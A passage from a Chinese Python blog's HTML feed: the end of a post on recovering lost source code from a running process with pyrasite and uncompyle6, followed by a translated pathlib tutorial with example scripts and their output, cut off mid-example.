<span class="string">'ReversePythonConnection'</span>, <span class="string">'ReversePythonShell'</span>, <span class="string">'StringIO'</span>, <span class="string">'Test'</span>, <span class="string">'__annotations__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>, <span class="string">'__warningregistry__'</span>, <span class="string">'json'</span>, <span class="string">'pyrasite'</span>, <span class="string">'socket'</span>, <span class="string">'sys'</span>, <span class="string">'test'</span>, <span class="string">'threading'</span>, <span class="string">'time'</span>, <span class="string">'traceback'</span>, <span class="string">'uncompyle6'</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(test)</div><div class="line">[<span class="string">'__annotations__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__kwdefaults__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__qualname__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(Test)</div><div class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__module__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'__weakref__'</span>, <span class="string">'foo'</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dir(Test.foo)</div><div class="line">[<span class="string">'__annotations__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__closure__'</span>, <span class="string">'__code__'</span>, <span class="string">'__defaults__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__get__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__globals__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__kwdefaults__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__module__'</span>, <span class="string">'__name__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__qualname__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>]</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>uncompyle6.main.decompile(<span class="number">3.6</span>, test.__code__, sys.stdout)</div><div class="line"><span class="comment"># uncompyle6 version 2.16.0</span></div><div class="line"><span class="comment"># Python bytecode 3.6</span></div><div class="line"><span class="comment"># Decompiled from: Python 3.6.3 (default, Nov  1 2017, 18:31:17) </span></div><div class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-16)]</span></div><div class="line"><span class="comment"># Embedded file name: test.py</span></div><div class="line">print(<span class="string">'test'</span>)</div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    print(<span class="string">'123'</span>)</div><div class="line">    time.sleep(<span class="number">3</span>)&lt;uncompyle6.semantics.pysource.SourceWalker object at <span class="number">0x7f0a563a4ef0</span>&gt;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>uncompyle6.main.decompile(<span class="number">3.6</span>, Test.foo.__code__, sys.stdout)</div><div class="line"><span class="comment"># uncompyle6 version 2.16.0</span></div><div class="line"><span class="comment"># Python bytecode 3.6</span></div><div class="line"><span class="comment"># Decompiled from: Python 3.6.3 (default, Nov  1 2017, 18:31:17) </span></div><div class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-16)]</span></div><div class="line"><span class="comment"># Embedded file name: test.py</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">    print(<span class="string">'foo'</span>)&lt;uncompyle6.semantics.pysource.SourceWalker object at <span class="number">0x7f0a556dae10</span>&gt;</div><div class="line"></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure><p>uncompyle6.main.decompile(bytecode_version, co, out=None, **kwargs)可以将函数字节码反编译为源码，其中前三个参数最重要：</p><ul><li>bytecode_version：表示需要恢复的Python字节码的版本，可以选择2.7、3.6等版本</li><li>co：表示函数的字节码对象，不同版本的字节码对象不一样<ul><li>2.7版本的函数字节码对象：test.func<em>code或者test.</em> <em>code</em> _</li><li>2.7版本的对象字节码对象：Test.foo.im_func.func_code或者Test.foo.im<em>func.</em> <em>code</em> _</li><li>3.6版本的函数字节码对象：test._ <em>code</em> _</li><li>3.6版本的对象字节码对象：Test.foo._ <em>code</em> _</li></ul></li><li>out：表示源码输出对象，可以是sys.stdout直接屏幕打印，也可以是文件对象<br><img src="/2018/02/27/如何恢复丢失的Python源代码如果它还在内存中运行/2.png" alt="运行效果"></li></ul><p>注意：字节码对象中并没有注释，所以恢复出来的代码中并没有注释，不过可以在_ <em>doc</em> _对象中找回，另外该uncompyle6.main.decompile()只能反编译常规函数，不适用与协程，所以对象中有多个方法必须一个一个的反编译，比较麻烦。</p><p><strong>参考文章：<a href="https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12" target="_blank" rel="external">https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12</a></strong></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Python tips </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>pathlib：文件系统路径作为对象</title>
      <link href="/2018/02/08/pathlib%EF%BC%9A%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%B7%AF%E5%BE%84%E4%BD%9C%E4%B8%BA%E5%AF%B9%E8%B1%A1/"/>
      <url>/2018/02/08/pathlib%EF%BC%9A%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%B7%AF%E5%BE%84%E4%BD%9C%E4%B8%BA%E5%AF%B9%E8%B1%A1/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>pathlib：文件系统路径作为对象</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>目的：使用面向对象的API解析，构建，测试文件名和路径，而不是使用低级别的字符串操作。</p><h2 id="路径表示"><a href="#路径表示" class="headerlink" title="路径表示"></a>路径表示</h2><ul><li>pathlib包含用于管理使用POSIX标准或Microsoft Windows语法格式化的文件系统路径的类。它包括所谓的“pure”类，它们对字符串进行操作，但不与实际的文件系统交互；和“concrete”类，它们将API扩展到包含反映或修改本地文件系统数据的操作。</li><li>pure类PurePosixPath和PureWindowsPath可以在任何操作系统上实例化和使用，因为他们只在名字上工作。为了实例化correct类来处理真正的文件系统，使用Path会根据平台的不同自动来获取PosixPath或WindowsPath。</li></ul><h2 id="构建Paths"><a href="#构建Paths" class="headerlink" title="构建Paths"></a>构建Paths</h2><p>要实例化一个新的路径，需要给一个字符串作为第一个参数。路径对象的字符串表示形式是该名称值。要创建一个引用相对于现有路径的值的新路径，使用/运算符来扩展路径。运算符的参数可以是字符串或其他路径对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_operator.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">usr = pathlib.PurePosixPath(<span class="string">'/usr'</span>)</div><div class="line">print(usr)</div><div class="line"></div><div class="line">usr_local = usr / <span class="string">'local'</span></div><div class="line">print(usr_local)</div><div class="line"></div><div class="line">usr_share = usr / pathlib.PurePosixPath(<span class="string">'share'</span>)</div><div class="line">print(usr_share)</div><div class="line"></div><div class="line">root = usr / <span class="string">'..'</span></div><div class="line">print(root)</div><div class="line"></div><div class="line">etc = root / <span class="string">'/etc/'</span></div><div class="line">print(etc)</div></pre></td></tr></table></figure></p><p>正如示例输出中的root值所示，操作符将所给的路径值接合在一起，并且在包含父目录引用“..”时不会规范化结果。但是，如果一个段以路径分隔符开始，它将被解释为一个新的“root”引用，就像os.path.join()。从路径值中间删除额外路径分隔符，像例子中的etc一样。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_operator.py</div><div class="line"></div><div class="line">/usr</div><div class="line">/usr/<span class="built_in">local</span></div><div class="line">/usr/share</div><div class="line">/usr/..</div><div class="line">/etc</div></pre></td></tr></table></figure></p><p>concrete路径类包含了一个resolve()方法，用于通过查看目录和符号链接的文件系统并生成名称引用的绝对路径来标准化路径。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_resolve.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">usr_local = pathlib.Path(<span class="string">'/usr/local'</span>)</div><div class="line">share = usr_local / <span class="string">'..'</span> / <span class="string">'share'</span></div><div class="line">print(share.resolve())</div></pre></td></tr></table></figure></p><p>这里相对路径被转换为绝对路径/etc/share。如果输入路径包含符号链接，那么也会扩展这些符号链接以允许解析的路径直接引用目标。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_resolve.py</div><div class="line"></div><div class="line">/usr/share</div></pre></td></tr></table></figure></p><p>要在事先不知道段的情况下构建路径，使用joinpath()，将每个路径段作为单独的参数传递。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_joinpath.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">root = pathlib.PurePosixPath(<span class="string">'/'</span>)</div><div class="line">subdirs = [<span class="string">'usr'</span>, <span class="string">'local'</span>]</div><div class="line">usr_local = root.joinpath(*subdirs)</div><div class="line">print(usr_local)</div></pre></td></tr></table></figure></p><p>和使用/操作符一样，调用joinpath()创建一个新的实例。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_joinpath.py</div><div class="line"></div><div class="line">/usr/<span class="built_in">local</span></div></pre></td></tr></table></figure></p><p>给定一个现有的路径对象，很容易建立一个小的差异新对象，如引用同一目录中的不同文件。使用with_name()创建一个新路径，用不同的文件名替换路径的名称部分。使用with_suffix()创建一个新路径，用不同的值替换文件名的扩展名。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_from_existing.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">ind = pathlib.PurePosixPath(<span class="string">'source/pathlib/index.rst'</span>)</div><div class="line">print(ind)</div><div class="line"></div><div class="line">py = ind.with_name(<span class="string">'pathlib_from_existing.py'</span>)</div><div class="line">print(py)</div><div class="line"></div><div class="line">pyc = py.with_suffix(<span class="string">'.pyc'</span>)</div><div class="line">print(pyc)</div></pre></td></tr></table></figure></p><p>这两种方法都返回新的对象，并保持左边部分不变。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_from_existing.py</div><div class="line"></div><div class="line"><span class="built_in">source</span>/pathlib/index.rst</div><div class="line"><span class="built_in">source</span>/pathlib/pathlib_from_existing.py</div><div class="line"><span class="built_in">source</span>/pathlib/pathlib_from_existing.pyc</div></pre></td></tr></table></figure></p><h2 id="解析Paths"><a href="#解析Paths" class="headerlink" title="解析Paths"></a>解析Paths</h2><p>Path对象具有用于从名称中提取部分值的方法和属性。例如，parts属性会生成一系列基于路径分隔符值解析的路径段。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_parts.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.PurePosixPath(<span class="string">'/usr/local'</span>)</div><div class="line">print(p.parts)</div></pre></td></tr></table></figure></p><p>该序列是一个元组，反映了路径实例的不变性。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_parts.py</div><div class="line"></div><div class="line">(<span class="string">'/'</span>, <span class="string">'usr'</span>, <span class="string">'local'</span>)</div></pre></td></tr></table></figure></p><p>有两种方法可以从一个给定的路径对象中“up”导航文件系统层次结构。parent属性引用了包含路径目录的新路径实例，这些值由os.path.dirname()返回。parents属性是一个迭代器，它产生父目录引用，不断地“up”路径层次直到到达根目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_parents.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.PurePosixPath(<span class="string">'/usr/local/lib'</span>)</div><div class="line"></div><div class="line">print(<span class="string">'parent: &#123;&#125;'</span>.format(p.parent))</div><div class="line"></div><div class="line">print(<span class="string">'\nhierarchy:'</span>)</div><div class="line"><span class="keyword">for</span> up <span class="keyword">in</span> p.parents:</div><div class="line">    print(up)</div></pre></td></tr></table></figure></p><p>该示例遍历parents项属性并打印成员值。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_parents.py</div><div class="line"></div><div class="line">parent: /usr/<span class="built_in">local</span></div><div class="line"></div><div class="line">hierarchy:</div><div class="line">/usr/<span class="built_in">local</span></div><div class="line">/usr</div><div class="line">/</div></pre></td></tr></table></figure></p><p>路径的其他部分可以通过路径对象的属性来访问。name属性保存了最后一个路径分隔符后的路径的最后部分（与os.path.basename()产生的值相同）。suffix属性保存扩展分隔符后面的值，并且stem属性保留后缀之前的名称部分。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_name.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.PurePosixPath(<span class="string">'./source/pathlib/pathlib_name.py'</span>)</div><div class="line">print(<span class="string">'path  : &#123;&#125;'</span>.format(p))</div><div class="line">print(<span class="string">'name  : &#123;&#125;'</span>.format(p.name))</div><div class="line">print(<span class="string">'suffix: &#123;&#125;'</span>.format(p.suffix))</div><div class="line">print(<span class="string">'stem  : &#123;&#125;'</span>.format(p.stem)</div></pre></td></tr></table></figure></p><p>尽管suffix和stem值和os.path.splitext()产生的值相似，但是这些值仅仅基于name属性，而不是完整路径。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_name.py</div><div class="line"></div><div class="line">path  : <span class="built_in">source</span>/pathlib/pathlib_name.py</div><div class="line">name  : pathlib_name.py</div><div class="line">suffix: .py</div><div class="line">stem  : pathlib_name</div></pre></td></tr></table></figure></p><h2 id="创建Concrete-Paths"><a href="#创建Concrete-Paths" class="headerlink" title="创建Concrete Paths"></a>创建Concrete Paths</h2><p>concrete path类的实例可以通过引用文件系统上的文件，目录或符号链接的名称（或潜在名称）的字符串参数来创建。该类还提供了几种便捷方法来构建使用常用位置的目录，如当前工作目录和用户主目录。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_convenience.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">home = pathlib.Path.home()</div><div class="line">print(<span class="string">'home: '</span>, home)</div><div class="line"></div><div class="line">cwd = pathlib.Path.cwd()</div><div class="line">print(<span class="string">'cwd : '</span>, cwd)</div></pre></td></tr></table></figure></p><p>这两种方法创建Path实例都是通过预填充绝对文件系统引用。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_convenience.py</div><div class="line"></div><div class="line">home:  /Users/dhellmann</div><div class="line">cwd :  /Users/dhellmann/PyMOTW</div></pre></td></tr></table></figure></p><h2 id="目录内容"><a href="#目录内容" class="headerlink" title="目录内容"></a>目录内容</h2><p>有三种方法可以访问目录列表，以发现文件系统上可用文件的名称。iterdir()是一个生成器，为包含目录中的每个项目生成一个新的Path实例。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_iterdir.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'.'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p.iterdir():</div><div class="line">    print(f)</div></pre></td></tr></table></figure></p><p>如果路径没有引用目录，则iterdir()会引发NotADirectoryError异常。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_iterdir.py</div><div class="line"></div><div class="line">example_link</div><div class="line">index.rst</div><div class="line">pathlib_chmod.py</div><div class="line">pathlib_convenience.py</div><div class="line">pathlib_from_existing.py</div><div class="line">pathlib_glob.py</div><div class="line">pathlib_iterdir.py</div><div class="line">pathlib_joinpath.py</div><div class="line">pathlib_mkdir.py</div><div class="line">pathlib_name.py</div><div class="line">pathlib_operator.py</div><div class="line">pathlib_ownership.py</div><div class="line">pathlib_parents.py</div><div class="line">pathlib_parts.py</div><div class="line">pathlib_read_write.py</div><div class="line">pathlib_resolve.py</div><div class="line">pathlib_rglob.py</div><div class="line">pathlib_rmdir.py</div><div class="line">pathlib_stat.py</div><div class="line">pathlib_symlink_to.py</div><div class="line">pathlib_touch.py</div><div class="line">pathlib_types.py</div><div class="line">pathlib_unlink.py</div></pre></td></tr></table></figure></p><p>使用glob()仅查找匹配模式的文件。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_glob.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'..'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p.glob(<span class="string">'*.rst'</span>):</div><div class="line">    print(f)</div></pre></td></tr></table></figure></p><p>此示例显示脚本的父目录中的所有reStructuredText输入文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_glob.py</div><div class="line"></div><div class="line">../about.rst</div><div class="line">../algorithm_tools.rst</div><div class="line">../book.rst</div><div class="line">../compression.rst</div><div class="line">../concurrency.rst</div><div class="line">../cryptographic.rst</div><div class="line">../data_structures.rst</div><div class="line">../dates.rst</div><div class="line">../dev_tools.rst</div><div class="line">../email.rst</div><div class="line">../file_access.rst</div><div class="line">../frameworks.rst</div><div class="line">../i18n.rst</div><div class="line">../importing.rst</div><div class="line">../index.rst</div><div class="line">../internet_protocols.rst</div><div class="line">../language.rst</div><div class="line">../networking.rst</div><div class="line">../numeric.rst</div><div class="line">../persistence.rst</div><div class="line">../porting_notes.rst</div><div class="line">../runtime_services.rst</div><div class="line">../text.rst</div><div class="line">../third_party.rst</div><div class="line">../unix.rst</div></pre></td></tr></table></figure></p><p>glob处理器支持使用模式前缀**或通过调用rglob()而不是glob()来进行递归扫描。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_rglob.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'..'</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> f <span class="keyword">in</span> p.rglob(<span class="string">'pathlib_*.py'</span>):</div><div class="line">    print(f)</div></pre></td></tr></table></figure></p><p>因为这个例子从父目录开始，所以需要递归搜索来找到匹配pathlib _ *.py的示例文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_rglob.py</div><div class="line"></div><div class="line">../pathlib/pathlib_chmod.py</div><div class="line">../pathlib/pathlib_convenience.py</div><div class="line">../pathlib/pathlib_from_existing.py</div><div class="line">../pathlib/pathlib_glob.py</div><div class="line">../pathlib/pathlib_iterdir.py</div><div class="line">../pathlib/pathlib_joinpath.py</div><div class="line">../pathlib/pathlib_mkdir.py</div><div class="line">../pathlib/pathlib_name.py</div><div class="line">../pathlib/pathlib_operator.py</div><div class="line">../pathlib/pathlib_ownership.py</div><div class="line">../pathlib/pathlib_parents.py</div><div class="line">../pathlib/pathlib_parts.py</div><div class="line">../pathlib/pathlib_read_write.py</div><div class="line">../pathlib/pathlib_resolve.py</div><div class="line">../pathlib/pathlib_rglob.py</div><div class="line">../pathlib/pathlib_rmdir.py</div><div class="line">../pathlib/pathlib_stat.py</div><div class="line">../pathlib/pathlib_symlink_to.py</div><div class="line">../pathlib/pathlib_touch.py</div><div class="line">../pathlib/pathlib_types.py</div><div class="line">../pathlib/pathlib_unlink.py</div></pre></td></tr></table></figure></p><h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>每个Path实例都包含处理它所引用的文件内容的方法。要立即检索内容，请使用read_bytes()或read_text()方法。要写入文件，请使用write_bytes()或write_text()。使用open()方法打开文件并保留文件句柄，而不是将名称传递给内置的open()函数。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_read_write.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">f = pathlib.Path(<span class="string">'example.txt'</span>)</div><div class="line"></div><div class="line">f.write_bytes(<span class="string">'This is the content'</span>.encode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line"><span class="keyword">with</span> f.open(<span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> handle:</div><div class="line">    print(<span class="string">'read from open(): &#123;!r&#125;'</span>.format(handle.read()))</div><div class="line"></div><div class="line">print(<span class="string">'read_text(): &#123;!r&#125;'</span>.format(f.read_text(<span class="string">'utf-8'</span>)))</div></pre></td></tr></table></figure></p><p>便捷方法在打开文件并写入之前进行一些类型检查，否则就相当于直接进行操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_read_write.py</div><div class="line"></div><div class="line"><span class="built_in">read</span> from open(): <span class="string">'This is the content'</span></div><div class="line">read_text(): <span class="string">'This is the content'</span></div></pre></td></tr></table></figure></p><h2 id="操纵目录和符号链接"><a href="#操纵目录和符号链接" class="headerlink" title="操纵目录和符号链接"></a>操纵目录和符号链接</h2><p>表示不存在的目录或符号链接的路径可用于创建关联的文件系统条目。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># pathlib_mkdir.py</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> pathlib</div><div class="line"></div><div class="line">p = pathlib.Path(<span class="string">'example_dir'</span>)</div><div class="line"></div><div class="line">print(<span class="string">'Creating &#123;&#125;'</span>.format(p))</div><div class="line">p.mkdir()</div></pre></td></tr></table></figure></p><p>如果路径已经存在，mkdir()会引发一个FileExistsError异常。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python3 pathlib_mkdir.py</div><div class="line"></div><div 